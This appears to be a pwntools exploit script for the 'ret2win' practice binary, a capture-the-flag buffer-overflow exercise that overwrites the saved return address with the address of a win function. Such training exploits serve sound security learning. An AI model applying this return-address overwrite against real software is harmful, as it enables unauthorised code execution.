from pwn import *

binary = './ret2win'
elf = context.binary = ELF(binary)

p = process(binary)

payload = b'a'*40
payload+= p64(elf.sym['ret2win']+1)

p.sendline(payload)
p.interactive()